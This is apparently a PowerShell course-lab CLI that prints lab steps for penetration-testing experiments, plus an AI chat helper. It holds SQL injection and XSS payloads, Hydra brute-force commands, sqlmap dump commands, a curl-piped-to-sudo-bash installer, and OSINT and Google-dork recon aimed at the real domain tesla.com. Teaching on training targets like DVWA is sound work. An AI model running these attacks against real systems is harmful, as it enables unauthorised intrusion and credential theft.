# s7.ps1 — S7 Cyber Security Lab CLI for PowerShell (zero dependencies)
param(
    [Parameter(Position=0)][string]$Cmd = "",
    [Parameter(Position=1, ValueFromRemainingArguments=$true)][string[]]$Rest
)

$EnvFile = Join-Path $PSScriptRoot ".env"
if (Test-Path $EnvFile) {
    Get-Content $EnvFile | ForEach-Object {
        if ($_ -match '^\s*([A-Za-z_][A-Za-z0-9_]*)\s*=\s*"?([^"]*)"?\s*$') {
            [System.Environment]::SetEnvironmentVariable($Matches[1], $Matches[2], "Process")
        }
    }
}
$CfgFile = Join-Path $PSScriptRoot ".s7config.json"
$Cfg = @{
    vercel = if ($env:S7_VERCEL_URL) { $env:S7_VERCEL_URL } else { "https://arxec-lab.vercel.app" }
    cf     = $env:S7_CF_URL
    key    = if ($env:S7_API_KEY) { $env:S7_API_KEY } else { $env:GEMINI_API_KEY }
}
if (Test-Path $CfgFile) {
    try {
        $j = Get-Content $CfgFile -Raw | ConvertFrom-Json
        if ($j.vercel) { $Cfg.vercel = $j.vercel }
        if ($j.cf)     { $Cfg.cf = $j.cf }
        if ($j.key)    { $Cfg.key = $j.key }
    } catch {}
}

function Show-Help {
    Write-Host "S7 Lab CLI — Usage & Navigation" -ForegroundColor Cyan
    Write-Host "`nInteractive Menu:" -ForegroundColor Yellow
    Write-Host "  .\s7.ps1                Open interactive menu (PowerShell)" -ForegroundColor Green
    Write-Host "  ./s7                    Open interactive menu (Ubuntu / Linux Bash)" -ForegroundColor Green
    Write-Host "`nDirect Commands:" -ForegroundColor Yellow
    Write-Host "  .\s7.ps1 <1-8>          Full instructions + commands for Exp 1-8" -ForegroundColor Green
    Write-Host "  .\s7.ps1 c <1-8>        Commands-Only mode (only commands & payloads, e.g. .\s7.ps1 c 7)" -ForegroundColor Green
    Write-Host "  .\s7.ps1 list           List all 8 experiments" -ForegroundColor Green
    Write-Host "  .\s7.ps1 s <keyword>    Search across all experiments" -ForegroundColor Green
    Write-Host "  .\s7.ps1 ai `"<query>`"   Ask AI via proxy or free-tier fallback" -ForegroundColor Green
    Write-Host "  .\s7.ps1 cfg            Configure Vercel / Cloudflare URLs" -ForegroundColor Green
    Write-Host "  .\s7.ps1 help           Show this help guide" -ForegroundColor Green
}

$FullExps = @{
    1 = @"
Exp 1: Familiarization of Application Penetration Testing (Theory)
> Aim: Familiarize with application penetration testing concepts, recon tools, and ethical rules.
> 1. Application Penetration Testing: Simulates real-world attacks on web/mobile apps to find insecure coding, misconfigurations, auth flaws, and data leaks.
> 2. Passive Reconnaissance: Gather info without touching target (WHOIS, search engines, Shodan).
theHarvester, Maltego, Recon-ng, Shodan
> 3. Active Reconnaissance: Directly probe target for open ports, services, and directories.
Nmap, Burp Suite, OWASP ZAP, Nikto, DirBuster, Gobuster, FFUF
> 4. Ethics: Written authorization required, strict scope adherence, avoid DoS/data loss, responsible reporting.
"@
    2 = @"
Exp 2 (Practical 1): Reconnaissance & Info Gathering Using Recon-ng
> Aim: Gather public OSINT on tesla.com using Recon-ng (subdomains, WHOIS PoC, brute-force, Bing).
> Step 1: Install & Launch Recon-ng (Ubuntu / Kali)
sudo apt update && sudo apt install -y recon-ng
recon-ng
# Ubuntu git clone fallback if apt package is unavailable:
git clone https://github.com/lanmaster53/recon-ng.git && cd recon-ng && pip install -r REQUIREMENTS && ./recon-ng

> Step 2: Create & Select Workspace (isolates target data)
workspaces create testspace
workspaces select testspace

> Step 3: Search & Install Required Marketplace Modules
marketplace search
marketplace install recon/domains-hosts/hackertarget
marketplace install recon/domains-contacts/whois_pocs
marketplace install recon/domains-hosts/brute_hosts
marketplace install recon/domains-hosts/bing_domain_web

> Step 4: Subdomain Discovery via HackerTarget
modules load recon/domains-hosts/hackertarget
options set SOURCE tesla.com
run

> Step 5: WHOIS Point of Contact (PoC) Extraction
modules load recon/domains-contacts/whois_pocs
options set SOURCE tesla.com
run

> Step 6: Brute-Force Subdomain Discovery
modules load recon/domains-hosts/brute_hosts
options set SOURCE tesla.com
run

> Step 7: Subdomain Discovery via Bing Search & View Results
modules load recon/domains-hosts/bing_domain_web
options set SOURCE tesla.com
run
show hosts
show contacts
"@
    3 = @"
Exp 3 (Practical 2): Network Footprinting & Enumeration (Maltego, Nmap, Gobuster, FFUF)
> Aim: Identify live hosts, open ports, service versions, OS, and hidden web directories.
> Step 0: Ubuntu Tool & Wordlist Setup
sudo apt update && sudo apt install -y nmap gobuster ffuf dirb curl
sudo mkdir -p /usr/share/wordlists/dirb && sudo curl -sL https://raw.githubusercontent.com/v0re/dirb/master/wordlists/common.txt -o /usr/share/wordlists/dirb/common.txt

> Step 1: Passive Recon using Maltego (Machines > Run Machine > Footprint L1 > testphp.vulnweb.com)
maltego

> Step 2: Active Scanning using Nmap (-sn: ping sweep, -sV: version, -O: OS, -p-: all 65535 ports, -A: aggressive, -Pn: skip ping, -T4: fast, -F: top 100 ports)
sudo nmap -sn <Target-IP>/24
sudo nmap -sV -O -p- -A -T4 <TARGET-IP>
sudo nmap -sV -p 80,443 -A -T4 testphp.vulnweb.com
sudo nmap -F testphp.vulnweb.com

> Step 3: Web Directory Enumeration with Gobuster
gobuster dir -u http://<lab-machine-ip> -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://testphp.vulnweb.com -w /usr/share/wordlists/dirb/common.txt

> Step 4: Alternative Directory Enumeration using FFUF
ffuf -u http://testphp.vulnweb.com/FUZZ -w /usr/share/wordlists/dirb/common.txt
"@
    4 = @"
Exp 4 (Practical 3): OSINT-Based Enumeration of Web Infrastructure
> Aim: Identify subdomains, emails, DNS records (NS, A, MX, SOA, TXT/SPF), and login portals.
> Step 0: Ubuntu Setup
sudo apt update && sudo apt install -y dnsutils dnsrecon theharvester
curl -sL https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/subdomains-top1million-5000.txt -o subdomains.txt

> Step 1: DNS Enumeration using DNSRecon
dnsrecon -d tesla.com
dnsrecon -d tesla.com -t std --xml tesla_dns.xml
dnsrecon -d tesla.com -t brt -D subdomains.txt

> Step 2: Subdomain & Email Enumeration using theHarvester
theHarvester -d tesla.com -b bing

> Step 3: DNS Record Query using Dig
dig tesla.com
dig +short NS tesla.com
dig +short MX tesla.com

> Step 4: Discovering Login Interfaces using Google Dorking (inurl:, intitle:, filetype:, site:, intext:)
inurl:admin site:tesla.com
intitle:"login" site:tesla.com
inurl:login site:testphp.vulnweb.com
filetype:php inurl:admin
site:github.com inurl:login
"@
    5 = @"
Exp 5 (Practical 4): Web App Testing using WPScan, OWASP ZAP, NVD & Hydra
> Aim: Identify vulnerabilities, CVEs/CWEs, misconfigurations, and weak passwords on WordPress.
> Definitions: NVD (https://nvd.nist.gov/) | CVE (Unique Vuln ID) | CWE (CWE-79 XSS, CWE-89 SQLi)
> Step 0: Ubuntu Setup
sudo apt update && sudo apt install -y hydra ruby-full build-essential libcurl4-openssl-dev libxml2-dev libxslt1-dev
sudo gem install wpscan && sudo snap install zaproxy --classic
curl -sL https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt -o rockyou.txt

> Step 1: Scan WordPress with WPScan (u=users, vp=vulnerable plugins, vt=vulnerable themes)
wpscan --url http://<target-ip> --enumerate u,vp,vt

> Step 2 & 3: Validate CVEs in NVD & Run OWASP ZAP (proxy 127.0.0.1:8080, Traditional + AJAX Spider, Active Scan)
zaproxy &

> Step 4: Brute-Force WordPress Login with Hydra
sort fsocity.dic | uniq > fsocity.dic.uniq
hydra -L rockyou.txt -p blah <target-ip> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'
hydra -l elliot -P rockyou.txt <target-ip> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid password'
"@
    6 = @"
Exp 6 (Practical 5): Auth, Authorization & Identity Flaws in OWASP Juice Shop
> Aim: Test role access (/administration), registration, account enumeration, Burp Intruder Cluster Bomb, lockout, cache, and OSINT reset.
> Environment Setup: Launch Juice Shop on port 42000 & configure Burp proxy (127.0.0.1:8080)
sudo docker run --rm -d -p 42000:3000 --name juice-shop bkimminich/juice-shop
sudo apt update && sudo apt install -y juice-shop && sudo juice-shop

> Firefox Localhost Proxy Fix (if Burp doesn't intercept 127.0.0.1):
about:config -> network.proxy.allow_hijacking_localhost = true

> Step 3: Burp Intruder Cluster Bomb (Intercept POST /rest/user/login -> Send to Intruder -> Clear § -> Add § on user & pass -> Uncheck '.' in Payload Encoding)
username=§USERNAME§&password=§PASSWORD§
# Payload Set 1 (Usernames):
admin@juice-sh.op, administrator@juice-sh.op, root@juice-sh.op, user@juice-sh.op, test@juice-sh.op, guest@juice-sh.op, manager@juice-sh.op, support@juice-sh.op, security@juice-sh.op
# Payload Set 2 (Passwords):
admin, password, 123456, juice, welcome, admin123

> Step 4: Jim's Password Reset (Green Smoothie review mentions 'replicator' -> Star Trek -> James T. Kirk's eldest brother's middle name)
Email: jim@juice-sh.op
Security Answer: Samuel
"@
    7 = @"
Exp 7 (Practical 6): SQL Injection & Blind SQL Injection in DVWA
> Aim: Demonstrate Classic UNION SQLi and Boolean/Automated Blind SQLi in DVWA (Login: admin / password -> Security: Low).
> Step 1: Install DVWA & SQLMap
sudo apt update && sudo apt install -y sqlmap curl
sudo bash -c "`$(curl --fail --show-error --silent --location https://raw.githubusercontent.com/IamCarron/DVWA-Script/main/Install-DVWA.sh)"
sudo docker run --rm -d -p 80:80 --name dvwa vulnerables/web-dvwa

> Part A: Classic SQL Injection Payloads (Step 5: Error, Step 6: Auth Bypass, Step 7: Version, Step 8: Tables & Columns)
1'
1' AND 1=2 #
1' OR '1'='1
1' UNION SELECT null, version() #
1' UNION SELECT null, table_name FROM information_schema.tables #
1' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users' #
1' UNION SELECT user, password FROM users #

> Part B: Manual Blind SQL Injection Payloads (Step 10-12: Boolean True/False & Substring)
1'
1' AND 1=1 #
1' AND 1=2 #
1' AND SUBSTRING(database(),1,1)='d' #

> Part B: Automated Blind SQLi with SQLMap (Step 13-14: Replace YOUR_COOKIE with PHPSESSID)
sqlmap --url="http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=YOUR_COOKIE; security=low" --dbs --batch
sqlmap --url="http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=YOUR_COOKIE; security=low" -p id -D dvwa --tables --batch --threads 5
sqlmap --url="http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="PHPSESSID=YOUR_COOKIE; security=low" -D dvwa -T users --dump --batch --threads 5
"@
    8 = @"
Exp 8 (Practical 7): Client-Side Testing (HTML Injection & XSS in DVWA)
> Aim: Demonstrate HTML Injection, JS Cookie Theft, and Reflected, Stored, and DOM XSS in DVWA (Low Security).
> Step 2: HTML Injection (Vulnerabilities -> XSS (Stored) -> Sign Guestbook)
<h1>Website Defaced by Student</h1>

> Step 3: JavaScript Execution & Cookie Theft (XSS (Stored) — increase input maxlength in DevTools if needed)
<script>alert('JavaScript Executed!')</script>
<script>alert('Cookies: ' + document.cookie)</script>

> Step 4: Reflected XSS (Vulnerabilities -> XSS (Reflected))
<button onclick="alert('1')">Click Me!</button>

> Step 5: DOM-Based XSS (Vulnerabilities -> XSS (DOM) -> Edit URL bar default= parameter)
http://localhost/dvwa/vulnerabilities/xss_d/?default=<script>alert('DOM XSS')</script>

> Step 6: Stored XSS (Compact Event Handler) & Filter-Bypass Payloads
<div onmouseover=alert(1)>Hover</div>
<img src=x onmouseover=alert('XSS')>
<img src=invalidImage onerror=alert('XSS')>
<input autofocus onfocus=alert('XSS')>
<body onload=alert('XSS')>
<a href="javascript:alert('XSS')">Click Me</a>
<iframe src="javascript:alert('Iframe XSS')"></iframe>
"@
}

function Show-Exp([int]$n, [bool]$CmdsOnly = $false) {
    if (-not $FullExps.ContainsKey($n)) { Show-Help; return }
    $lines = $FullExps[$n] -split "`r?`n"
    Write-Host $lines[0] -ForegroundColor Cyan
    foreach ($l in $lines[1..($lines.Count-1)]) {
        if ($l.StartsWith(">")) {
            if (-not $CmdsOnly) { Write-Host $l.Substring(2) -ForegroundColor Yellow }
        } elseif ($l.StartsWith("#")) {
            Write-Host $l -ForegroundColor DarkGray
        } elseif ($l.Trim() -ne "") {
            Write-Host $l -ForegroundColor Green
        } else {
            Write-Host ""
        }
    }
}

$HistFile = Join-Path $PSScriptRoot ".s7chat_history"

function Get-LocalRAG([string]$text) {
    $t = $text.ToLower()
    $ids = @()
    if ($t -match 'exp(eriment)?\s*1|passive|active|familiarization|shodan|nikto|ethics') { $ids += 1 }
    if ($t -match 'exp(eriment)?\s*2|pract(ical)?\s*1|recon-?ng|hackertarget|whois_pocs|brute_hosts|bing_domain') { $ids += 2 }
    if ($t -match 'exp(eriment)?\s*3|pract(ical)?\s*2|maltego|nmap|gobuster|ffuf|footprint|common\.txt') { $ids += 3 }
    if ($t -match 'exp(eriment)?\s*4|pract(ical)?\s*3|dnsrecon|theharvester|dig|dork|inurl|intitle') { $ids += 4 }
    if ($t -match 'exp(eriment)?\s*5|pract(ical)?\s*4|wpscan|zap|zaproxy|hydra|nvd|cve|cwe|wordpress|rockyou|elliot') { $ids += 5 }
    if ($t -match 'exp(eriment)?\s*6|pract(ical)?\s*5|juice|burp|intruder|cluster\s*bomb|samuel|jim|42000|allow_hijacking') { $ids += 6 }
    if ($t -match 'exp(eriment)?\s*7|pract(ical)?\s*6|sqli|sql\s*injection|sqlmap|blind|union|dvwa|phpsessid') { $ids += 7 }
    if ($t -match 'exp(eriment)?\s*8|pract(ical)?\s*7|xss|client-?side|html\s*injection|cookie|onmouseover|onerror|dom') { $ids += 8 }
    $chunks = @()
    foreach ($id in ($ids | Select-Object -First 2)) { $chunks += $FullExps[$id] }
    return ($chunks -join "`n`n")
}

function Send-AIQuery([string]$q) {
    if ($q.ToLower() -in @("clear", "/clear")) {
        if (Test-Path $HistFile) { Remove-Item $HistFile -Force }
        Write-Host "Conversation history cleared." -ForegroundColor Yellow
        return
    }
    $hist = if (Test-Path $HistFile) { (Get-Content $HistFile -Tail 8) -join "`n" } else { "" }
    $rag = Get-LocalRAG "$q $hist"
    $payload = ""
    if ($rag) { $payload += "Local Lab Context (RAG):`n$rag`n`n" }
    if ($hist) { $payload += "Recent Conversation:`n$hist`n`n" }
    $payload += "User: $q"

    $ans = ""
    foreach ($u in @($Cfg.vercel, $Cfg.cf)) {
        if (-not $u) { continue }
        try {
            $res = Invoke-RestMethod -Uri ($u.TrimEnd('/') + "/ask") -Method Post -Headers @{ "X-Client-RAG" = "1" } -ContentType "text/plain; charset=utf-8" -Body ([System.Text.Encoding]::UTF8.GetBytes($payload)) -TimeoutSec 35
            if ($res -and -not $res.StartsWith("[ERROR]")) {
                $ans = ($res -replace '```[a-z]*', '').Trim()
                if ($ans) { break }
            }
        } catch {}
    }
    if (-not $ans -and $Cfg.key) {
        foreach ($m in @("gemini-3.5-flash-lite", "gemini-3.1-flash-lite", "gemini-2.5-flash", "gemma-4-26b-a4b-it")) {
            try {
                $body = @{ contents = @(@{ parts = @(@{ text = "Concise terminal answer: $payload" }) }) } | ConvertTo-Json -Depth 5
                $r = Invoke-RestMethod -Uri "https://generativelanguage.googleapis.com/v1beta/models/$($m):generateContent?key=$($Cfg.key)" -Method Post -ContentType "application/json" -Body $body -TimeoutSec 25
                $ans = ($r.candidates[0].content.parts[0].text -replace '```[a-z]*', '').Trim()
                if ($ans) { break }
            } catch {}
        }
    }
    if ($ans) {
        Write-Host $ans
        $shortAns = ($ans -replace "`r?`n", " ")
        if ($shortAns.Length -gt 300) { $shortAns = $shortAns.Substring(0, 300) }
        Add-Content -Path $HistFile -Value "User: $q`nAssistant: $shortAns"
        return
    }
    Write-Host "Error: Could not reach proxy ($($Cfg.vercel))." -ForegroundColor Red
}

function Ask-AI([string]$q) {
    if ($q) { Send-AIQuery $q; return }
    Write-Host "Continuous AI Chat (Lab context active • type 'clear' to reset, 'q' to exit)" -ForegroundColor Cyan
    while ($true) {
        $in = (Read-Host "ai").Trim()
        if (-not $in) { continue }
        if ($in.ToLower() -in @("q", "quit", "exit", "b", "back")) { break }
        Send-AIQuery $in
        Write-Host ""
    }
}

if ($Cmd -match '^[1-8]$') { Show-Exp ([int]$Cmd) $false; exit }
if ($Cmd -in @("c", "cmd", "cmds")) { Show-Exp ([int]$Rest[0]) $true; exit }
if ($Cmd -in @("h", "help", "-h", "--help")) { Show-Help; exit }
if ($Cmd -in @("l", "ls", "list")) { 1..8 | ForEach-Object { Write-Host (($FullExps[$_] -split "`r?`n")[0]) }; exit }
if ($Cmd -in @("s", "search")) {
    $kw = $Rest -join " "
    1..8 | ForEach-Object {
        if ($FullExps[$_] -match $kw) {
            Write-Host "`n[Exp $_]" -ForegroundColor Cyan
            ($FullExps[$_] -split "`r?`n") | Where-Object { $_ -match $kw } | ForEach-Object { Write-Host $_ -ForegroundColor Green }
        }
    }
    exit
}
if ($Cmd -in @("a", "ai", "ask")) { Ask-AI ($Rest -join " "); exit }
if ($Cmd -in @("cfg", "config")) {
    $v = Read-Host "Vercel URL [$($Cfg.vercel)]"; if ($v) { $Cfg.vercel = $v }
    $c = Read-Host "Cloudflare URL [$($Cfg.cf)]"; if ($c) { $Cfg.cf = $c }
    $Cfg | ConvertTo-Json | Set-Content $CfgFile
    exit
}

1..8 | ForEach-Object { Write-Host (($FullExps[$_] -split "`r?`n")[0]) -ForegroundColor Cyan }
Write-Host "`nCommands: [1-8] Full Exp | [c 1-8] Cmds-Only | [s <kw>] Search | [ai <q>] Ask AI | [h] Help | [cfg] Proxy | [q] Quit" -ForegroundColor DarkGray
while ($true) {
    $in = (Read-Host "`ns7").Trim()
    if ($in -in @("q", "quit", "exit")) { break }
    elseif ($in -in @("h", "help")) { Show-Help }
    elseif ($in -match '^[1-8]$') { Show-Exp ([int]$in) $false }
    elseif ($in -match '^c\s+([1-8])$') { Show-Exp ([int]$Matches[1]) $true }
    elseif ($in.StartsWith("s ")) { & $PSCommandPath s ($in.Substring(2)) }
    elseif ($in.StartsWith("ai ") -or $in.StartsWith("a ")) { Ask-AI (($in -split "\s+", 2)[1]) }
    elseif ($in -eq "cfg") { & $PSCommandPath cfg }
}
